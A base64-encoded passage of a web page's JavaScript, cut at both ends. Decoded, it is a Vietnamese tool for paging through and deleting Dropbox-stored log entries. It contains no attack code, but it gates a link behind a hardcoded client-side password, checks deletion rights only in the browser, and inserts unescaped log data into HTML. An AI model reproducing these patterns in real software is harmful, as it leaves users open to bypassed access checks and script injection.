IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VyJyk7DQogIGlmIChwYWdlciAmJiAhcGFnZXIuZGF0YXNldC5ib3VuZCkgew0KICAgIHBhZ2VyLmRhdGFzZXQuYm91bmQgPSAnMSc7DQogICAgcGFnZXIuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICAgIHBhZ2VyLmFkZEV2ZW50TGlzdGVuZXIoJ21vdXNlZG93bicsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogIH0NCn0pKCk7DQoNCjwvc2NyaXB0Pg0KDQo8c2NyaXB0Pg0KZnVuY3Rpb24gdmVyaWZ5QW5kT3BlbkxpbmsodXJsKSB7DQoNCg0KICAvLyBPdmVybGF5IHThu5FpIChjbGljayB2w6BvIHPhur0gdOG6r3QpDQogIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgT2JqZWN0LmFzc2lnbihvdmVybGF5LnN0eWxlLCB7DQogICAgcG9zaXRpb246ICdmaXhlZCcsIGluc2V0OiAnMCcsIGJhY2tncm91bmQ6ICdyZ2JhKDAsMCwwLDAuNSknLA0KICAgIGRpc3BsYXk6ICdmbGV4JywganVzdGlmeUNvbnRlbnQ6ICdjZW50ZXInLCBhbGlnbkl0ZW1zOiAnY2VudGVyJywNCiAgICB6SW5kZXg6ICcxMDAwMCcNCiAgfSk7DQoNCiAgLy8gS2h1bmcgcG9wdXANCiAgY29uc3QgYm94ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIGJveC5jbGFzc05hbWUgPSAncG9wdXAteG9hJzsNCg0KICAvLyBUacOqdSDEkeG7gSBuZ+G6r24gZ+G7jW4gKGtow7RuZyBjw7MgaWNvbi9n4butaSBk4buvIGxp4buHdSkNCiAgY29uc3QgdGl0bGUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgdGl0bGUudGV4dENvbnRlbnQgPSAnTmjhuq1wIG3huq10IGto4bqpdSDEkeG7gyBt4bufIGxpbmsnOw0KICB0aXRsZS5zdHlsZS5mb250V2VpZ2h0ID0gJzYwMCc7DQoNCiAgLy8gw5Qgbmjhuq1wIG3huq10IGto4bqpdQ0KICBjb25zdCBpbnB1dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7DQogIE9iamVjdC5hc3NpZ24oaW5wdXQsIHsgdHlwZTogJ3Bhc3N3b3JkJywgcGxhY2Vob2xkZXI6ICdN4bqtdCBraOG6qXUnIH0pOw0KaW5wdXQuY2xhc3NOYW1lID0gJ3BvcHVwLWlucHV0JzsNCg0KICAvLyBUaMO0bmcgYsOhbyBs4buXaSAo4bqpbiBt4bq3YyDEkeG7i25oKQ0KICBjb25zdCBlcnIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgZXJyLnRleHRDb250ZW50ID0gJ+KdjCBTYWkgbeG6rXQga2jhuql1ISc7DQogIE9iamVjdC5hc3NpZ24oZXJyLnN0eWxlLCB7IGNvbG9yOiAncmVkJywgZm9udFNpemU6ICcxNHB4JywgZGlzcGxheTogJ25vbmUnIH0pOw0KDQogIC8vIE7DunQgeMOhYyBuaOG6rW4NCiAgY29uc3QgYnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYnV0dG9uJyk7DQogIGJ0bi50ZXh0Q29udGVudCA9ICdYw6FjIG5o4bqtbic7DQogIE9iamVjdC5hc3NpZ24oYnRuLnN0eWxlLCB7DQogICAgcGFkZGluZzogJzEwcHggMTZweCcsIGJhY2tncm91bmQ6ICcjMzQ5OGRiJywgY29sb3I6ICcjZmZmJywNCiAgICBib3JkZXI6ICdub25lJywgYm9yZGVyUmFkaXVzOiAnNnB4JywgY3Vyc29yOiAncG9pbnRlcicNCiAgfSk7DQoNCiAgLy8gUHJvZ3Jlc3MgYmFyICjEkeG6t3QgRMav4buaSSBDw5lORykNCiAgY29uc3QgYmFyV3JhcCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBPYmplY3QuYXNzaWduKGJhcldyYXAuc3R5bGUsIHsNCiAgICB3aWR0aDogJzEwMCUnLCBiYWNrZ3JvdW5kOiAnI2RkZCcsIGhlaWdodDogJzZweCcsDQogICAgYm9yZGVyUmFkaXVzOiAnM3B4JywgbWFyZ2luVG9wOiAnMTJweCcNCiAgfSk7DQogIGNvbnN0IGJhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBPYmplY3QuYXNzaWduKGJhci5zdHlsZSwgeyB3aWR0aDogJzAlJywgaGVpZ2h0OiAnMTAwJScsIGJhY2tncm91bmQ6ICcjMzQ5OGRiJyB9KTsNCiAgYmFyV3JhcC5hcHBlbmRDaGlsZChiYXIpOw0KDQogIC8vIEfhuq9uIHbDoG8gRE9NDQogIGJveC5hcHBlbmRDaGlsZCh0aXRsZSk7DQogIGJveC5hcHBlbmRDaGlsZChpbnB1dCk7DQogIGJveC5hcHBlbmRDaGlsZChlcnIpOw0KICBib3guYXBwZW5kQ2hpbGQoYnRuKTsNCiAgYm94LmFwcGVuZENoaWxkKGJhcldyYXApOw0KICBvdmVybGF5LmFwcGVuZENoaWxkKGJveCk7DQogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQob3ZlcmxheSk7DQoNCiAgLy8gQ2jhurduIGNsaWNrIGLDqm4gdHJvbmcga2jDtG5nIMSRw7NuZw0KICBib3guYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICAvLyBDbGljayByYSBuZ2/DoGkgxJHhu4MgdOG6r3QNCiAgb3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOw0KICB9KTsNCg0KICAvLyBY4butIGzDvSB4w6FjIG5o4bqtbg0KICBhc3luYyBmdW5jdGlvbiBzdWJtaXQoKSB7DQogICAgLy8gxJDhu5VpIG3huq10IGto4bqpdSDhu58gxJHDonkNCiAgICBjb25zdCBPSyA9IGlucHV0LnZhbHVlID09PSAnMSEnOw0KDQogICAgaWYgKCFPSykgew0KICAgICAgZXJyLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICBlcnIuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICBidG4uZGlzYWJsZWQgPSB0cnVlOw0KICAgIGlucHV0LmRpc2FibGVkID0gdHJ1ZTsNCg0KICAgIC8vIEFuaW1hdGUgcHJvZ3Jlc3MgbmhhbmggbMOqbiAxMDAlDQogICAgYmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC42cyBlYXNlJzsNCiAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gKGJhci5zdHlsZS53aWR0aCA9ICcxMDAlJykpOw0KICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgd2luZG93Lm9wZW4odXJsLCAnX2JsYW5rJyk7DQogICAgICBpZiAob3ZlcmxheS5wYXJlbnROb2RlKSBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOw0KICAgIH0sIDY1MCk7DQogIH0NCg0KICBidG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBzdWJtaXQpOw0KICBpbnB1dC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgKGUpID0+IHsNCiAgICBpZiAoZS5rZXkgPT09ICdFbnRlcicpIHN1Ym1pdCgpOw0KICB9KTsNCg0KICAvLyBGb2N1cyBuZ2F5IMO0IG3huq10IGto4bqpdQ0KICBzZXRUaW1lb3V0KCgpID0+IGlucHV0LmZvY3VzKCksIDApOw0KfQ0KDQpmdW5jdGlvbiBleHRyYWN0RmlsZW5hbWUoZHJvcGJveFByZXZpZXdVcmwpIHsNCiAgdHJ5IHsNCiAgICBjb25zdCB1ID0gbmV3IFVSTChkcm9wYm94UHJldmlld1VybCk7DQogICAgY29uc3QgcCA9IHUuc2VhcmNoUGFyYW1zLmdldCgncHJldmlldycpOw0KICAgIHJldHVybiBkZWNvZGVVUklDb21wb25lbnQocCB8fCAnJyk7DQogIH0gY2F0Y2ggeyByZXR1cm4gJyc7IH0NCn0NCg0KLy8gSOG7mXAgeMOhYyBuaOG6rW4geG/DoSAodHLhuqMgduG7gSBQcm9taXNlPGJvb2xlYW4+KQ0KZnVuY3Rpb24gY29uZmlybURlbGV0ZVBvcHVwKHRleHQ9J0LhuqFuIGPDsyBjaOG6r2MgbXXhu5FuIHhvw6E/Jywgb25lQnV0dG9uPWZhbHNlKSB7DQogIHJldHVybiBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHsNCiAgICBjb25zdCBvdmVybGF5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogICAgT2JqZWN0LmFzc2lnbihvdmVybGF5LnN0eWxlLCB7DQogICAgICBwb3NpdGlvbjonZml4ZWQnLCBpbnNldDonMCcsIGJhY2tncm91bmQ6J3JnYmEoMCwwLDAsMC41KScsDQogICAgICBkaXNwbGF5OidmbGV4JywgYWxpZ25JdGVtczonY2VudGVyJywganVzdGlmeUNvbnRlbnQ6J2NlbnRlcicsIHpJbmRleDoxMDAwMQ0KICAgIH0pOw0KDQogICAgY29uc3QgYm94ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogICAgIGJveC5jbGFzc05hbWUgPSAncG9wdXAteG9hJzsNCiAgICBib3guaW5uZXJIVE1MID0gYA0KICAgICAgPGRpdiBzdHlsZT0iZm9udC13ZWlnaHQ6NjAwOyBtYXJnaW4tYm90dG9tOjhweCI+WMOhYyBuaOG6rW4geG/DoTwvZGl2Pg0KICAgICAgPGRpdiBzdHlsZT0ibWFyZ2luLWJvdHRvbToxNHB4Ij4ke3RleHR9PC9kaXY+DQogICAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7IGdhcDoxMHB4OyBqdXN0aWZ5LWNvbnRlbnQ6ZmxleC1lbmQiPg0KICAgICAgICA8YnV0dG9uIGlkPSJkbGdDYW5jZWwiIGNsYXNzPSJidG4iIHN0eWxlPSJiYWNrZ3JvdW5kOiM3ZjhjOGQiPkh14bu3PC9idXR0b24+DQogICAgICAgICR7IW9uZUJ1dHRvbiA/IGA8YnV0dG9uIGlkPSJkbGdZZXMiIGNsYXNzPSJidG4iIHN0eWxlPSJiYWNrZ3JvdW5kOiNlNzRjM2MiPlhvw6E8L2J1dHRvbj5gIDogJyd9DQogICAgICA8L2Rpdj4NCiAgICBgOw0KDQogICAgb3ZlcmxheS5hcHBlbmRDaGlsZChib3gpOw0KICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQob3ZlcmxheSk7DQoNCiAgICBib3guYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBlID0+IGUuc3RvcFByb3BhZ2F0aW9uKCkpOw0KICAgIG92ZXJsYXkuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7IGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7IHJlc29sdmUoZmFsc2UpOyB9KTsNCiAgICBib3gucXVlcnlTZWxlY3RvcignI2RsZ0NhbmNlbCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4geyBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOyByZXNvbHZlKGZhbHNlKTsgfSk7DQoNCiAgICBpZiAoIW9uZUJ1dHRvbikgew0KICAgICAgYm94LnF1ZXJ5U2VsZWN0b3IoJyNkbGdZZXMnKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsgcmVzb2x2ZSh0cnVlKTsgfSk7DQogICAgfQ0KICB9KTsNCn0NCg0KLy8gWG/DoSAxIGVudHJ5IGxvZyArIGZpbGUgRXhjZWwgdHLDqm4gRHJvcGJveCAodGhlbyBpbmRleCB0cm9uZyBt4bqjbmcgbG9ncykNCmFzeW5jIGZ1bmN0aW9uIGRlbGV0ZUxvZ0FuZEZpbGVfQnlJbmRleChpZHgpIHsNCiAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQogIGNvbnN0IGxvZ1BhdGggPSAnL3RodXRodWF0L2xvZy5qc29uJzsNCg0KICAvLyAxKSBU4bqjaSBsb2cuanNvbiBoaeG7h24gdOG6oWkNCiAgbGV0IGxvZ3MgPSBbXTsNCiAgdHJ5IHsNCiAgICBjb25zdCBkbCA9IGF3YWl0IGRieC5maWxlc0Rvd25sb2FkKHsgcGF0aDogbG9nUGF0aCB9KTsNCiAgICBjb25zdCB0ZXh0ID0gYXdhaXQgZGwucmVzdWx0LmZpbGVCbG9iLnRleHQoKTsNCiAgICBsb2dzID0gSlNPTi5wYXJzZSh0ZXh0IHx8ICdbXScpOw0KICB9IGNhdGNoIChlKSB7DQogICAgYWxlcnQoJ0tow7RuZyDEkeG7jWMgxJHGsOG7o2MgbG9nLmpzb24gdHLDqm4gRHJvcGJveC4nKTsgDQogICAgdGhyb3cgZTsNCiAgfQ0KDQogIGNvbnN0IGl0ZW0gPSBsb2dzW2lkeF07DQogIGlmICghaXRlbSkgeyBhbGVydCgnS2jDtG5nIHTDrG0gdGjhuqV5IG3hu6VjIGPhuqduIHhvw6EuJyk7IHJldHVybjsgfQ0KDQogIC8vIDIpIEzhuqV5IGZpbGVOYW1lICYgeG/DoSBmaWxlIEV4Y2VsIChu4bq/dSBjw7MpDQogIGNvbnN0IGZpbGVOYW1lID0gZXh0cmFjdEZpbGVuYW1lKGl0ZW0ubGluayB8fCAnJyk7DQogIGNvbnN0IGZpbGVQYXRoID0gZmlsZU5hbWUgPyBgL3RodXRodWF0LyR7ZmlsZU5hbWV9YCA6IG51bGw7DQoNCiAgdHJ5IHsNCiAgICBpZiAoZmlsZVBhdGgpIHsgYXdhaXQgZGJ4LmZpbGVzRGVsZXRlVjIoeyBwYXRoOiBmaWxlUGF0aCB9KTsgfQ0KICB9IGNhdGNoIChlKSB7DQogICAgLy8gTuG6v3UgZmlsZSBraMO0bmcgdOG7k24gdOG6oWkgduG6q24gdGnhur9wIHThu6VjIHhvw6EgbG9nDQogICAgY29uc29sZS53YXJuKCdYb8OhIGZpbGUgRXhjZWwgbOG7l2kva2jDtG5nIHThu5NuIHThuqFpLCB0aeG6v3AgdOG7pWMgeG/DoSBsb2cuLi4nLCBlKTsNCiAgfQ0KDQogIC8vIDMpIEPhuq1wIG5o4bqtdCBsb2c6IGLhu48gcGjhuqduIHThu60gaWR4IHbDoCBnaGkgxJHDqCBs4bqhaQ0KICBsb2dzLnNwbGljZShpZHgsIDEpOw0KICBhd2FpdCBkYnguZmlsZXNVcGxvYWQoew0KICAgIHBhdGg6IGxvZ1BhdGgsDQogICAgY29udGVudHM6IEpTT04uc3RyaW5naWZ5KGxvZ3MsIG51bGwsIDIpLA0KICAgIG1vZGU6IHsgJy50YWcnOiAnb3ZlcndyaXRlJyB9LA0KICAgIGF1dG9yZW5hbWU6IGZhbHNlDQogIH0pOw0KfQ0KDQoNCmFzeW5jIGZ1bmN0aW9uIG9uRGVsZXRlTG9nUm93KGluZGV4SW5Mb2dzLCBjdXJyZW50VXNlcikgew0KICAvLyBO4bq/dSBraMO0bmcgcGjhuqNpIGRvY3RvciDihpIgcG9wdXAgY+G6pW0geG/DoSwgY2jhu4kgY8OzIDEgbsO6dCBIdeG7tw0KICBpZiAoY3VycmVudFVzZXIgIT09ICdkb2N0b3InKSB7DQogICAgYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKA0KICAgICAgJ+KdjCDDiiBsw6BtIGPDoWkgZ8OsIMSR4bqleXl5eSBlbSDGoWkuIDxici8+ROG7q25nIGzhuqFpIG5nYXksIHF1w6Egbmd1eSBoaeG7g20uJywNCiAgICAgIHRydWUgLy8gPC0tIGNo4bq/IMSR4buZIDEgbsO6dA0KICAgICk7DQogICAgcmV0dXJuOw0KICB9DQoNCiAgLy8gTuG6v3UgbMOgIGRvY3RvciDihpIgcG9wdXAgeMOhYyBuaOG6rW4geG/DoSAoMiBuw7p0KQ0KICBjb25zdCBvayA9IGF3YWl0IGNvbmZpcm1EZWxldGVQb3B1cCgNCiAgICAnQuG6oW4gY8OzIGNo4bqvYyBtdeG7kW4geG/DoSBt4bulYyBuw6B5PycsDQogICAgZmFsc2UNCiAgKTsNCiAgaWYgKCFvaykgcmV0dXJuOw0KDQogIHRyeSB7DQogICAgYXdhaXQgZGVsZXRlTG9nQW5kRmlsZV9CeUluZGV4KGluZGV4SW5Mb2dzKTsNCiAgICBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoJ+KchSDEkMOjIHhvw6EgdGjDoG5oIGPDtG5nIScsIHRydWUpOw0KICAgIGF3YWl0IHNob3dEcm9wYm94UGFuZWwoKTsNCiAgfSBjYXRjaCAoZSkgew0KICAgIGNvbnNvbGUuZXJyb3IoZSk7DQogICAgYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKCfimqDvuI8gQ8OzIGzhu5dpIGtoaSB4b8OhLiBWdWkgbMOybmcgdGjhu60gbOG6oWkuJywgdHJ1ZSk7DQogIH0NCn0NCg0KLy8gxJDDs25nIHBhbmVsIGtoaSBi4bqlbSBFU0MgaG/hurdjIGNsaWNrIHJhIG5nb8OgaQ0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGUpIHsNCiAgaWYgKGUua2V5ID09PSAiRXNjYXBlIikgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkcm9wYm94UGFuZWwiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICB9DQp9KTsNCg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihlKSB7DQogIGNvbnN0IHBhbmVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRyb3Bib3hQYW5lbCIpOw0KICBpZiAocGFuZWwuc3R5bGUuZGlzcGxheSA9PT0gImJsb2NrIiB8fCBwYW5lbC5zdHlsZS5kaXNwbGF5ID09PSAiZmxleCIpIHsNCiAgICBjb25zdCBjb250ZW50ID0gcGFuZWwucXVlcnlTZWxlY3RvcigiZGl2Iik7DQogICAgLy8gTuG6v3UgY2xpY2sgbmdvw6BpIHbDuW5nIG7hu5lpIGR1bmcgcGFuZWwNCiAgICBpZiAoIWNvbnRlbnQuY29udGFpbnMoZS50YXJnZXQpKSB7DQogICAgICBwYW5lbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgIH0NCiAgfQ0KfSk7DQoNCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCi8vID09PT09PSBQSMOCTiBUUkFORyBC4bqiTkcgTE9HIFRST05HIFBPUFVQID09PT09PQ0KbGV0IERCX0xPR1MgPSBbXTsgICAgICAgLy8gdG/DoG4gYuG7mSBsb2dzIMSRw6MgdOG6o2kNCmxldCBEQl9QQUdFID0gMTsgICAgICAgIC8vIHRyYW5nIGhp4buHbiB04bqhaQ0KbGV0IERCX1BBR0VfU0laRSA9IDEwOyAgLy8gc+G7kSBkw7JuZyAvIHRyYW5nDQpsZXQgREJfQ1VSUkVOVF9VU0VSID0gJyc7IC8vIHVzZXIgxJFhbmcgxJHEg25nIG5o4bqtcCAobG93ZXJjYXNlKSDEkeG7gyByZW5kZXIgbsO6dCBYb8OhDQoNCmZ1bmN0aW9uIHNldFBhZ2VTaXplKHNpemUpew0KICBEQl9QQUdFX1NJWkUgPSBOdW1iZXIoc2l6ZSkgfHwgMTA7DQogIERCX1BBR0UgPSAxOw0KICByZW5kZXJEcm9wYm94UGFnZSgpOw0KfQ0KDQpmdW5jdGlvbiBnb1RvUGFnZShwKXsNCiAgY29uc3QgbWF4ID0gTWF0aC5tYXgoMSwgTWF0aC5jZWlsKERCX0xPR1MubGVuZ3RoIC8gREJfUEFHRV9TSVpFKSk7DQogIERCX1BBR0UgPSBNYXRoLm1pbihNYXRoLm1heCgxLCBwKSwgbWF4KTsNCiAgcmVuZGVyRHJvcGJveFBhZ2UoKTsNCn0NCg0KZnVuY3Rpb24gcmVuZGVyRHJvcGJveFBhZ2UoKXsNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveEZpbGVMaXN0Jyk7DQogIGNvbnN0IHBhZ2VCdG5zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlQnV0dG9ucycpOw0KICBjb25zdCBwYWdlSW5mbyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFnZUluZm8nKTsNCg0KICBpZighdGJvZHkpIHJldHVybjsNCg0KICAvLyBy4buXbmc/DQogIGlmKCFBcnJheS5pc0FycmF5KERCX0xPR1MpIHx8IERCX0xPR1MubGVuZ3RoID09PSAwKXsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7Y29sb3I6cmVkIj5LaMO0bmcgY8OzIGRhbmggc8OhY2ggbsOgbyDEkcaw4bujYyBsxrB1PC90ZD48L3RyPmA7DQogICAgaWYocGFnZUJ0bnMpIHBhZ2VCdG5zLmlubmVySFRNTCA9ICcnOw0KICAgIGlmKHBhZ2VJbmZvKSBwYWdlSW5mby50ZXh0Q29udGVudCA9ICcnOw0KICAgIHJldHVybjsNCiAgfQ0KDQogIGNvbnN0IHRvdGFsID0gREJfTE9HUy5sZW5ndGg7DQogIGNvbnN0IG1heFBhZ2UgPSBNYXRoLm1heCgxLCBNYXRoLmNlaWwodG90YWwgLyBEQl9QQUdFX1NJWkUpKTsNCiAgaWYoREJfUEFHRSA+IG1heFBhZ2UpIERCX1BBR0UgPSBtYXhQYWdlOw0KDQogIGNvbnN0IHN0YXJ0SWR4ID0gKERCX1BBR0UgLSAxKSAqIERCX1BBR0VfU0laRTsNCiAgY29uc3QgZW5kSWR4ICAgPSBNYXRoLm1pbihzdGFydElkeCArIERCX1BBR0VfU0laRSwgdG90YWwpOw0KICBjb25zdCBzbGljZSAgICA9IERCX0xPR1Muc2xpY2Uoc3RhcnRJZHgsIGVuZElkeCk7DQoNCiAgLy8gUmVuZGVyIGJvZHkgdGhlbyB0cmFuZw0KICB0Ym9keS5pbm5lckhUTUwgPSBzbGljZS5tYXAoKGl0ZW0sIGkpID0+IGANCiAgICA8dHI+DQogICAgICA8dGQ+JHtzdGFydElkeCArIGkgKyAxfTwvdGQ+DQogICAgICA8dGQ+JHtpdGVtLmtob2EgfHwgJyd9PC90ZD4NCiAgICAgIDx0ZD4keyhpdGVtLm5nYXkgfHwgJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcwMDowMDowMCcsJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcyMzo1OTo1OScsJycpDQogICAgICAgICAgIC5yZXBsYWNlKCdU4burJywnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJ8SR4bq/bicsJyAtPiAnKQ0KICAgICAgICAgICAucmVwbGFjZSgvXHMrL2csJyAnKQ0KICAgICAgICAgICAudHJpbSgpfTwvdGQ+DQoJCSAgIA0KCQkgICA8dGQ+JHtOdW1iZXIoaXRlbS5oZXJiX2Vycm9ycyB8fCAwKX08L3RkPg0KICAgICA8dGQ+JHtOdW1iZXIoaXRlbS50aW1lX2Vycm9ycyB8fCAwKX08L3RkPg0KICAgIDx0ZD4ke051bWJlcihpdGVtLmNvbmZsaWN0X2Vycm9ycyB8fCAwKX08L3RkPg0KCQkgICANCiAgICAgIDx0ZD4keyhpdGVtLnRpbWUgfHwgJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcsJywgJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcgJywgJyAtICcpDQogICAgICAgICAgIC5yZXBsYWNlKC9ccysvZywgJyAnKQ0KICAgICAgICAgICAudHJpbSgpfTwvdGQ+DQogICAgICA8dGQ+PGEgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBvbmNsaWNrPSJ2ZXJpZnlBbmRPcGVuTGluaygnJHtpdGVtLmxpbmt9JykiPlhlbTwvYT48L3RkPg0KICAgICAgPHRkPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIHN0eWxlPSJiYWNrZ3JvdW5kOiNlNzRjM2M7IHBhZGRpbmc6MTBweCAxNHB4OyBmb250LXNpemU6MTJweDsiDQogICAgICAgICAgb25jbGljaz0ib25EZWxldGVMb2dSb3coJHtzdGFydElkeCArIGl9LCAnJHtEQl9DVVJSRU5UX1VTRVJ9JykiPg0KICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS10cmFzaCI+PC9pPiBYb8OhDQogICAgICAgIDwvYnV0dG9uPg0KICAgICAgPC90ZD4NCiAgICA8L3RyPg0KICBgKS5qb2luKCcnKTsNCg0KICAvLyBSZW5kZXIgbsO6dCB0cmFuZyAoUHJldiDigKYgTmV4dCkg4oCUIGhp4buDbiB0aOG7iyBk4bqjaSB04buRaSDEkWEgNyBuw7p0IHPhu5ENCiAgaWYocGFnZUJ0bnMpew0KICAgIGNvbnN0IGJ0biA9IChsYWJlbCwgdGFyZ2V0LCBkaXNhYmxlZD1mYWxzZSwgdGl0bGU9JycpID0+DQogICAgICBgPGJ1dHRvbiBjbGFzcz0iYnRuIiAke2Rpc2FibGVkPydkaXNhYmxlZCc6Jyd9IHRpdGxlPSIke3RpdGxlfSINCiAgICAgICAgICAgICAgIHN0eWxlPSJwYWRkaW5nOjZweCAxMHB4JHtkaXNhYmxlZD8nO29wYWNpdHk6LjY7Y3Vyc29yOm5vdC1hbGxvd2VkJzonJ30iDQogICAgICAgICAgICAgICBvbmNsaWNrPSJnb1RvUGFnZSgke3RhcmdldH0pIj4ke2xhYmVsfTwvYnV0dG9uPmA7DQoNCiAgICBjb25zdCByYW5nZSA9IDM7IC8vIGhhaSBiw6puIHRyYW5nIGhp4buHbiB04bqhaQ0KICAgIGNvbnN0IGZyb20gID0gTWF0aC5tYXgoMSwgREJfUEFHRSAtIHJhbmdlKTsNCiAgICBjb25zdCB0byAgICA9IE1hdGgubWluKG1heFBhZ2UsIERCX1BBR0UgKyByYW5nZSk7DQoNCiAgICBsZXQgaHRtbCA9ICcnOw0KICAgIGh0bWwgKz0gYnRuKCfCqyDEkOG6p3UnLCAxLCBEQl9QQUdFPT09MSwgJ1RyYW5nIMSR4bqndScpOw0KICAgIGh0bWwgKz0gYnRuKCfigLkgVHLGsOG7m2MnLCBEQl9QQUdFLTEsIERCX1BBR0U9PT0xLCAnVHJhbmcgdHLGsOG7m2MnKTsNCiAgICBmb3IobGV0IHAgPSBmcm9tOyBwIDw9IHRvOyBwKyspew0KICAgICAgaHRtbCArPSBgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJnb1RvUGFnZSgke3B9KSINCiAgICAgICAgICAgICAgICAgc3R5bGU9InBhZGRpbmc6NnB4IDEwcHg7JHtwPT09REJfUEFHRT8nYmFja2dyb3VuZDojMmVjYzcxJzonJ30iPg0KICAgICAgICAgICAgICAgICAke3B9DQogICAgICAgICAgICAgICA8L2J1dHRvbj5gOw0KICAgIH0NCiAgICBodG1sICs9IGJ0bignU2F1IOKAuicsIERCX1BBR0UrMSwgREJfUEFHRT09PW1heFBhZ2UsICdUcmFuZyBzYXUnKTsNCiAgICBodG1sICs9IGJ0bignQ3Xhu5FpIMK7JywgbWF4UGFnZSwgREJfUEFHRT09PW1heFBhZ2UsICdUcmFuZyBjdeG7kWknKTsNCg0KICAgIHBhZ2VCdG5zLmlubmVySFRNTCA9IGh0bWw7DQogIH0NCg0KICBpZihwYWdlSW5mbyl7DQogICAgcGFnZUluZm8udGV4dENvbnRlbnQgPSBgVHJhbmcgJHtEQl9QQUdFfS8ke21heFBhZ2V9IOKAoiAke3N0YXJ0SWR4KzF9LSR7ZW5kSWR4fS8ke3RvdGFsfWA7DQogIH0NCn0NCg0KLy8gR+G6r24gc+G7sSBraeG7h24gxJHhu5VpIHBhZ2Ugc2l6ZSAoY2jhu4kgY+G6p24gZ+G7jWkgMSBs4bqnbiBzYXUga2hpIHBvcHVwIG3hu58pDQpmdW5jdGlvbiBhdHRhY2hQYWdlckV2ZW50c09uY2UoKXsNCiAgY29uc3Qgc2VsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlU2l6ZScpOw0KICBpZihzZWwgJiYgIXNlbC5kYXRhc2V0LmJvdW5kKXsNCiAgICBzZWwuZGF0YXNldC5ib3VuZCA9ICcxJzsNCiAgICBzZWwuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZSA9PiBzZXRQYWdlU2l6ZShlLnRhcmdldC52YWx1ZSkpOw0KICB9DQp9DQo8L3NjcmlwdD4NCjwhLS1E